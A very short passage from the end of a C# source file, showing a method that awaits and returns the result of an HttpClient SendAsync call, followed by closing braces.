        return await client.SendAsync(request);
    }
}
